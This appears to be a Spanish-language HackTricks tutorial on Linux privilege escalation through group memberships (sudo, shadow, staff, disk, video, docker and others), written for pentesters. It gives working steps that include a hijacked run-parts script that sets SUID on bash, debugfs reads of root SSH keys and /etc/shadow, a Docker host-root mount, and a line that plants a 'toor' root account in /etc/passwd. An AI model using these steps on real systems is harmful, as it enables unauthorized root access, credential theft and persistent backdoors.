# Grupos interesantes - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupos Sudo/administrador

### **PE - Método 1**

**A veces**, la política **/etc/sudoers** de un sistema (o un archivo incluido desde ella) contiene entradas como:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Esto significa que cualquier usuario que coincida con cualquiera de las entradas puede ejecutar cualquier comando como cualquier usuario de destino mediante `sudo` (sujeto al resto de la política).<sup>[[3]](#references)</sup>

Si este es el caso, **para convertirte en root, solo tienes que ejecutar**:

```
sudo su
```

Si `sudo -l` permite ejecutar `adduser` con restricciones y solo un nombre de usuario, comprueba si crea un grupo primario con el mismo nombre cuando este aún no existe. Una cuenta nueva en ese grupo podría obtener privilegios si la política efectiva de sudoers ya se los concede a `%group`; verifica tanto el comportamiento de creación del grupo como la regla del grupo antes de considerar esto una vía de escalada. Crear una cuenta modifica el sistema, así que inspecciona primero la política.

### PE - Method 2

Busca todos los binarios SUID y comprueba si está el binario **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Si **pkexec es un binario SUID**, puede ejecutar un programa como otro usuario solo cuando polkit autoriza la acción solicitada; el bit SUID por sí solo no garantiza acceso a root. Comprueba la política instalada y la autorización de la sesión objetivo en lugar de asumir que pertenecer a **sudo** o **admin** es suficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Para la ruta independiente de [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), primero verifica que `pkexec` sea un archivo ejecutable **propiedad de root y con SUID**. Un binario instalado sin ese bit no permite la escalada local SUID descrita en el aviso. Una cadena de versión upstream es solo una pista: las distribuciones pueden [retroportar la corrección a versiones anteriores del paquete](https://ubuntu.com/security/CVE-2021-4034), así que comprueba el paquete del proveedor instalado y las mitigaciones antes de considerarlo vulnerable.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) es una ruta distinta de polkit: una condición de carrera en la autorización de D-Bus, no un fallo SUID de `pkexec`. Revisa el paquete de polkit del proveedor instalado y si una acción privilegiada de D-Bus accesible puede realizar un cambio útil; una ruta para crear cuentas también requiere un servicio adecuado, como AccountsService, y el acceso a sudo del nuevo grupo depende de la política de sudo efectiva. Una versión de polkit reportada o un servicio instalado son solo indicios, especialmente cuando los proveedores [retroportan correcciones](https://access.redhat.com/security/cve/cve-2021-3560). La enumeración pasiva no debe activar la condición de carrera.

En las distribuciones que todavía usan el backend Local Authority anterior, inspecciona sus reglas de grupo con:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Los nombres de los grupos relevantes y los valores predeterminados varían según la distribución; un grupo solo es útil aquí si la política local lo menciona.<sup>[[5]](#references)</sup>

Para **convertirte en root, puedes ejecutar**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Si intentas ejecutar **pkexec** y obtienes este **error**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

En una sesión SSH sin un agente de autenticación registrado, `pkexec` puede fallar con este error incluso si la política permitiría la acción; polkit documenta `pkttyagent` como un agente de autenticación de texto para sesiones que no son de escritorio. El comportamiento exacto depende de la versión y la distribución, así que verifica la política local y la configuración del agente. Una solución alternativa reportada para algunas versiones afectadas de NixOS utiliza **2 sesiones SSH diferentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Una ACL que deniega a una cuenta el acceso a `su` se aplica a ese ejecutable, no a todas las vías para realizar una acción autorizada por un administrador. Si las credenciales de un administrador se exponen por otra vía, comprueba si la política de polkit efectiva permite una acción independiente, como iniciar un servicio transitorio del sistema mediante `systemd-run`; qué identidad acepta el agente de autenticación; y qué identidad usaría el servicio resultante. [Polkit distingue entre autenticarse como propietario de la sesión y como administrador](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), mientras que [systemd-run puede solicitar un servicio transitorio al administrador del sistema](https://systemd.io/CONTROL_GROUP_INTERFACE/). Una entrada del historial, un comando instalado o un archivo de política legible no demuestran por sí solos que haya autorización ni que las credenciales sean válidas; una revisión pasiva no debe enviar credenciales ni iniciar una unidad.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Grupo wheel

A veces, una política de sudoers también puede contener esta entrada:

```
%wheel	ALL=(ALL:ALL) ALL
```

Esto significa que cualquier usuario que coincida con la entrada puede ejecutar cualquier comando como cualquier usuario de destino mediante `sudo` (sujeto al resto de la política).<sup>[[3]](#references)</sup>

Si este es el caso, para **convertirte en root solo tienes que ejecutar**:

```
sudo su
```

## Grupo shadow

En los sistemas cuyos permisos se lo permiten, los usuarios del grupo **shadow** pueden **leer** **/etc/shadow**; verifica los permisos reales y las ACL del objetivo:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Así que lee el archivo e intenta **crackear algunos hashes**.

Una precisión rápida sobre el estado de bloqueo al analizar hashes:
- Las entradas con `!` o `*` generalmente no permiten iniciar sesión de forma interactiva con contraseña.
- `!hash` significa que la contraseña se bloqueó; los caracteres restantes representan el campo de contraseña anterior al bloqueo.
- Un campo que contiene `*` no es un hash válido de `crypt(3)` e impide iniciar sesión con contraseña de UNIX; no deduzcas de ello si se había establecido una contraseña.
Esto resulta útil para clasificar cuentas incluso cuando el inicio de sesión directo está bloqueado.<sup>[[6]](#references)</sup>

## Grupo staff

**staff**: Permite a los usuarios añadir modificaciones locales al sistema (`/usr/local`) sin necesitar privilegios de root (ten en cuenta que los ejecutables de `/usr/local/bin` están en la variable PATH de cualquier usuario y pueden «sustituir» a los ejecutables de `/bin` y `/usr/bin` que tengan el mismo nombre). Compáralo con el grupo «adm», que está más relacionado con la monitorización y la seguridad.<sup>[[2]](#references)[[7]](#references)</sup>

En las configuraciones de Debian donde `/usr/local/bin` precede a `/usr/bin` en `PATH` (como en los ejemplos siguientes), un comando sin ruta explícita resuelve primero a la copia de `/usr/local/bin`; confirma el `PATH` efectivo en el objetivo.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Si un proceso privilegiado resuelve un comando sin ruta explícita a través de un `/usr/local/bin` modificable, reemplazar ese comando puede ejecutarse con los privilegios del proceso; confirma la ruta real y el desencadenante antes de probarlo.

En sistemas Ubuntu, `pam_motd` ejecuta scripts ejecutables mediante `run-parts --lsbsysinit` como root al iniciar sesión; los trabajos de cron también pueden usar `run-parts`, pero esto depende de la distribución y la configuración.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

En un nuevo inicio de sesión SSH, `pspy` puede ayudar a confirmar si esta ruta se invoca realmente en el objetivo; puede observar las líneas de comandos de los procesos sin ser root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Grupo disk

La pertenencia al grupo **disk** puede otorgar acceso sin procesar a dispositivos de bloques y suele estar **cerca del acceso root**; Debian lo describe como prácticamente equivalente a root, pero verifica los permisos reales de los dispositivos y la disposición del almacenamiento en el objetivo.<sup>[[7]](#references)</sup>

Las rutas de dispositivo habituales incluyen `/dev/sd*`, pero NVMe y otras disposiciones de almacenamiento usan nombres diferentes.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` opera en sistemas de archivos ext2/ext3/ext4; rutas como `/root` y `/etc/shadow` son archivos dentro del sistema de archivos abierto, mientras que el segundo argumento de `dump` es una ruta de salida en el sistema de archivos nativo.<sup>[[8]](#references)</sup> Por ejemplo, esto extrae `/tmp/asd1.txt` del sistema de archivos abierto a `/tmp/asd2.txt` en el sistema de archivos nativo:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

La opción `-w` abre el sistema de archivos con permisos de lectura y escritura, y el comando `write` copia un archivo nativo al sistema de archivos abierto. Evita usarla en un sistema de archivos montado y en uso, ya que las modificaciones directas pueden dañarlo; cuando sea posible, trabaja con una imagen sin conexión.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Grupo Video

Con el comando `w` puedes averiguar **quién ha iniciado sesión en el sistema**, y mostrará una salida como la siguiente.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

La entrada **tty1** identifica la primera consola virtual de Linux; por sí sola, no demuestra que haya un usuario físicamente presente en la máquina, especialmente en contenedores u otros entornos.<sup>[[21]](#references)</sup>

En los sistemas que exponen un dispositivo framebuffer legible, pertenecer al grupo **video** puede otorgar acceso a ese dispositivo. La interfaz framebuffer de Linux documenta `/dev/fb0` como un dispositivo de memoria legible que se puede copiar para capturar la pantalla; la ruta `/sys/class/graphics/fb0/virtual_size` solo está disponible cuando existe ese atributo fbdev en sysfs, así que compruébalo primero en el objetivo.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Si la versión instalada de **GIMP** ofrece un importador de datos sin procesar, abre **`screen.raw`** con ese importador; la compatibilidad y los controles varían según la versión y el plug-in.<sup>[[22]](#references)</sup>

![Grupo de disco - Grupo de video: Para abrir la imagen sin procesar, puedes usar GIMP, seleccionar el archivo screen.raw y elegir Raw image data como tipo de archivo](<../../../images/image (463).png>)

Configura el ancho y el alto de la imagen para que coincidan con la geometría del framebuffer; prueba los formatos de píxel/ tipos de imagen disponibles hasta que el resultado sea legible.<sup>[[9]](#references)</sup>

![Grupo de disco - Grupo de video: Luego modifica el ancho y el alto para que coincidan con los de la pantalla y prueba distintos tipos de imagen (y selecciona el que muestre mejor la pantalla)](<../../../images/image (317).png>)

## Grupo root

Pertenecer al grupo **root** no proporciona el UID de root, pero los archivos modificables por el grupo y propiedad de `root` pueden ser interesantes si los utilizan servicios o bibliotecas con privilegios. Comprueba los permisos reales del archivo y cómo se utiliza antes de considerarlo una vía para escalar privilegios.

**Comprueba qué archivos pueden modificar los miembros de root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Grupo Docker

La pertenencia al grupo `docker` otorga acceso a nivel de root al daemon de Docker en instalaciones estándar con rootful. Como los bind mounts son de lectura y escritura de forma predeterminada, un usuario que pueda controlar ese daemon puede montar `/` del host en un contenedor y modificar archivos del host; esto, en la práctica, otorga root en el host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

La pertenencia a grupos puede no estar sincronizada entre `/etc/group`, `/etc/gshadow` y el token del proceso actual. Si un usuario no aparece en `id -nG`, pero `newgrp docker` funciona, comprueba el grupo que muestra `id` en el nuevo shell y verifica si el socket de Docker permite escritura y está asociado a un daemon rootful. El nombre del grupo, por sí solo, no demuestra que se pueda controlar el host. Limita cualquier sondeo automatizado con `newgrp` para evitar que una solicitud de contraseña detenga la enumeración.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Finalmente, si no te gusta ninguna de las sugerencias anteriores, o no funcionan por alguna razón (¿firewall de la API de Docker?), siempre puedes **ejecutar un contenedor privilegiado y escapar de él**, como se explica aquí:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Si tienes permisos de escritura sobre el socket de Docker, lee [**esta publicación sobre cómo escalar privilegios abusando del socket de Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Grupo adm

Por lo general, los **miembros** del grupo **`adm`** tienen permiso para **leer archivos de registro** ubicados en _/var/log/_.\
Por lo tanto, si has comprometido a un usuario que pertenece a este grupo, definitivamente deberías **revisar los registros**.<sup>[[7]](#references)</sup>

## Grupos backup / operator / lp / mail

Estos grupos tienen significados específicos según el servicio y la distribución. Debian documenta `backup` para las tareas delegadas de copia de seguridad/restauración, `lp` para los demonios de impresora y `mail` para `/var/mail`, así que comprueba los permisos locales antes de considerar la pertenencia al grupo una vía para escalar privilegios.<sup>[[7]](#references)</sup>

A menudo son vectores de **descubrimiento de credenciales**, más que vías directas para obtener root:
- **backup**: puede exponer archivos de respaldo con configuraciones, claves, volcados de bases de datos o tokens.
- **operator**: acceso operativo específico de la plataforma que puede filtrar datos confidenciales de ejecución.
- **lp**: las colas y los archivos temporales de impresión pueden contener el contenido de documentos.
- **mail**: los archivos de correo pueden exponer enlaces de restablecimiento, OTP y credenciales internas.

Considera la pertenencia a estos grupos como un hallazgo de exposición de datos de alto valor y pivota mediante la reutilización de contraseñas/tokens.

## Grupo auth

En OpenBSD, cuando S/Key está configurado, `/etc/skey` pertenece a `root:auth` y para acceder a sus registros se requiere pertenecer al grupo `auth`; los registros de YubiKey se almacenan en `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Una configuración vulnerable de OpenBSD 6.6 con S/Key o YubiKey habilitado permitía que los usuarios locales con privilegios de `auth` obtuvieran root; Qualys documenta el requisito previo y la cadena de explotación, y la PoC enlazada la implementa.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Autenticación de pkexec/pkttyagent sin una sesión de GUI (incidencia #18012 de NixOS)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Grupos del sistema - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — páginas del manual de Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manual de referencia de polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manual de referencia de polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manual de seguridad de Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — página del manual de Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [El dispositivo Frame Buffer — documentación del kernel de Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — páginas del manual de Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — páginas del manual de Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — supervisión de procesos de Linux sin privilegios](https://github.com/DominicBreuker/pspy)
- [13] [Seguridad de Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Administrar Docker como usuario sin privilegios de root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Ejecución de contenedores — Documentación de Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — páginas del manual de OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — páginas del manual de OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilidades de autenticación en OpenBSD — aviso de seguridad de Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC de explotación local](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivos asignados de Linux (versión 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importación y exportación de imágenes — Documentación de GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
